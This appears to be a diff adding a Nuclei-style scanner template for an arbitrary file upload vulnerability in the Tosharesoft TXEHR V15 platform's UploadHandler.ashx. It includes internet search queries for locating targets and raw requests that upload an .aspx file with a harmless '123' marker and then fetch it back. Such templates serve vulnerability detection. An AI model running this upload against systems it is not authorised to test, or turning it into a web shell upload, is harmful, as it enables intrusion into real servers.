@@ -1,0 +1,51 @@
+id: Tosharesoft_TXEHR_V15_UploadHandler_Fileupload
+
+info:
+  name: Tosharesoft_TXEHR_V15_UploadHandler_Fileupload
+  author: HK
+  severity: critical
+  description: 同享人力管理管理平台UploadHandler存在任意文件上传漏洞
+  metadata:
+    max-request: 2
+    Fofa-query: body="/Assistant/Default.aspx"
+    Quake-query: body="/Assistant/Default.aspx"
+    Hunter-query: body="/Assistant/Default.aspx"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1
+    Host: {{Hostname}}
+    accept: */*
+    Content-Type: multipart/form-data; boundary=---------------------------123
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
+    Content-Length: 172
+
+    -----------------------------123
+    Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
+    Content-Type: text/plain
+
+    123
+    -----------------------------123--
+  - |+
+    @timeout: 30s
+    GET /Handler/Uploadfile2/test.aspx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  max-redirects: 3
+  cookie-reuse: true
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - "123"
